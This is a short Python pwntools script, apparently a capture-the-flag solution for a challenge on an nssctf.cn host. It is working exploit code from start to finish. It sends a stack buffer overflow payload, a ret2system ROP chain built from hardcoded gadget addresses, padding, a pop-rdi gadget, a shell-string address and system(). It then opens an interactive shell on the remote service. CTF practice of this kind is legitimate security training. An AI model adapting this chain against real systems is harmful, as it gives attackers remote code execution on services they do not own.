from pwn import *

l = remote('node4.anna.nssctf.cn',28379)

sys = 0x400430

sh = 0x400541

pop_rdi = 0x4005e3

ret = 0x400416

payload = 0x18 * b'A' + p64(ret) + p64(pop_rdi)  + p64(sh) + p64(sys)

l.sendline(payload)

l.interactive()